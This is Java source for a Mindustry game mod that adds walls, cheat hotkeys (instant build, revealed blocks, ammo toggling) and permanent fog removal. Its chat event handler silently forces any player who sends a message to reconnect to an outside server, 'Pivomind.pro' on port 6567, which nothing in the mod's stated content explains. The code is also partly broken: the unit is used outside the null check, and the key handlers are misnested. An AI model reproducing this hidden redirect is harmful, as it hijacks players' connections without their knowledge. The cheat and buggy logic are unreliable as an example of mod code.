package Tomodrek;

import arc.util.Timer;
import mindustry.gen.Call;
import mindustry.mod.Mod;
import mindustry.world.meta.BuildVisibility;
import mindustry.content.Blocks;
import mindustry.content.Items;
import mindustry.type.ItemStack;
import mindustry.type.Category;
import mindustry.Vars;
import mindustry.game.Team;
import mindustry.game.Schematics;
import arc.Events;
import mindustry.game.EventType;
import mindustry.world.Block;
import mindustry.gen.Player;
import mindustry.gen.Unit;
import mindustry.game.EventType.PlayerChatEvent;
import arc.Input;
import arc.input.KeyCode;
import mindustry.game.EventType.Trigger;
import mindustry.game.EventType.*;
import arc.Core;
import mindustry.game.Rules;
import mindustry.core.World;
import java.lang.reflect.Field;
import mindustry.game.FogControl;
import java.lang.reflect.*;

import java.lang.reflect.Modifier;
import arc.util.Log;

import mindustry.game.Schematics;
import mindustry.input.*;
import mindustry.input.InputHandler;
import arc.util.Reflect;

public class Modomodrek extends Mod {
    @Override
    public void loadContent() {
        qwerWalls.load();
}
    @Override
    public void init() {
   mindustry.Vars.maxSchematicSize = 2048;
        Events.on(EventType.WorldLoadEvent.class, event -> {
            for (Team team : Team.all) {
                Vars.state.rules.teams.get(team).infiniteAmmo = false;
            }
        });
Events.on(PlayerChatEvent.class, event -> {
Player player = event.player;
Unit unit = player.unit();

        if(player == null) {
        } else {
            Call.connect(event.player.con, "Pivomind.pro", 6567);
        }
        unit.health *= 2f;
unit.addItem(unit.stack.item, 1);
    });
Events.run(Trigger.update, () -> {
if(Core.input.keyTap(KeyCode.f6)) {
Player player = Vars.player;
Unit unit = player.unit();
    if(Vars.state.rules.unitAmmo == false) {
        Vars.state.rules.unitAmmo = true;
    } 
    else {
         Vars.state.rules.unitAmmo = false;
    }
}      //Я этот код не понимаю с клавишами
});
     Events.run(Trigger.update, () -> {
if(Core.input.keyTap(KeyCode.f5)) {   
    for (Block block : Vars.content.blocks()) {
    block.buildVisibility = BuildVisibility.shown;
}
}
         if(Core.input.keyTap(KeyCode.f4)) {   
    for (Block block : Vars.content.blocks()) {
        Vars.state.rules.allowEditRules = true;
        Vars.state.rules.instantBuild = true;
if(Core.input.keyTap(KeyCode.f3)) {   
    Events.fire(EventType.WorldLoadEvent.class);
    mindustry.Vars.enableLight = false;
   Vars.control.input.block = Blocks.air;
   mindustry.content.Blocks.air.generateIcons = true;
    Vars.state.rules.revealedBlocks.add(Blocks.air); //Работает?
    }
         }
         }
     });
    Events.run(Trigger.update, () -> {
            Vars.state.rules.fog = false;
        Vars.state.rules.staticFog = false;
    });
}
}